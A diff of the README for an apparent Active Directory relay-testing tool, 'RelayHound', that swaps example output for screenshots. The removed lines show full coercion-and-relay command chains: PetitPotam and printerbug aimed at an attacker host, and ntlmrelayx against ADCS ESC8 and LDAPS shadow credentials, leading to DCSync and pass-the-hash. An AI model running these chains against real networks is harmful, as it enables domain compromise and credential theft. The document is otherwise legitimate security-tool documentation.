@@ -92,21 +92,7 @@ Each entry includes:
 
 Example output:
 
-```
-🔴 CRITICAL  Domain Compromise via ADCS ESC8
-  Prerequisites: ADCS ESC8 confirmed — certsrv HTTP endpoint accepts NTLM relay
-    # WebDAV coercion (WebClient running — bypasses SMB signing)
-    python3 PetitPotam.py -u lowpriv -p '<password>' -d corp.local <attacker-hostname>@80/share 10.10.10.1
-    ntlmrelayx.py -t http://ca.corp.local/certsrv/certfnsh.asp --adcs --template DomainController
-  ↳ Relay DC machine account auth to certsrv → obtain DC certificate → PKINITtools or Rubeus to get TGT → DCSync
-
-🟠 HIGH  Shadow Credentials → PKINIT → NT Hash
-  Prerequisites: LDAP relay viable + writable computer (WEB01) + KDC cert + ADCS present
-    # Coerce authentication from target
-    printerbug.py corp.local/lowpriv@10.10.10.1 10.10.10.99
-    ntlmrelayx.py -t ldaps://10.10.10.1 --shadow-credentials --shadow-target WEB01$
-  ↳ Writes msDS-KeyCredentialLink → PKINIT TGT for target machine account. Then: PKINITtools getnthash.py → pass-the-hash.
-```
+![Recommended Attack Paths Screenshot](screenshots/AttackPath.png)
 
 The Recommended Attack Paths section is included in both the Markdown and HTML reports.
 
@@ -118,17 +104,7 @@ When `--find-relay-targets` is passed, RelayHound performs an additional inbound
 
 This takes a different angle from the rest of the tool. Rather than asking "can I relay _to_ X?", it asks "if I coerce account X into authenticating, which relay attack should I chain it with, and against which target object?" The output is a table of candidates: account, recommended attack, target object, and the specific right that makes it exploitable.
 
-```
-Relay Target Candidates
-╭──────────────────┬─────────────┬──────────────────────────┬───────────────────────────╮
-│ Account          │   Attack    │ Target Object            │ Right                     │
-├──────────────────┼─────────────┼──────────────────────────┼───────────────────────────┤
-│ robb.stark       │  ACLAbuse   │ Domain Root (DCSync path)│ WriteDACL                 │
-│                  │  RBCD       │ CASTELBLACK$             │ WriteDACL                 │
-│                  │  ShadowCreds│ CASTELBLACK$             │ WriteDACL                 │
-│ Key Admins       │  ShadowCreds│ CASTELBLACK$             │ WriteProperty(msDS-Key...)│
-╰──────────────────┴─────────────┴──────────────────────────┴───────────────────────────╯
-```
+![Relay Target Finder Screenshot](screenshots/RelayTargetFinder.png)
 
 Requires: `impacket` and `ldap3` (both available on Kali by default).
 
@@ -175,7 +151,7 @@ Options:
   --modules LIST            Comma-separated list of module short names to run
                             (e.g. smb,rbcd,adcs). Invalid names print the full
                             list of valid aliases and exit.
-  --delay N                 Sleep N seconds between each attack module (default: 0)
+  --delay N                 Sleep N seconds between each attack module                                         (default: 0). Also randomises module execution order
   --jitter N                Add up to N seconds of random variation to the delay
                             (default: 0). Requires --delay.
   --timeout N               Network timeout in seconds (default: 10)
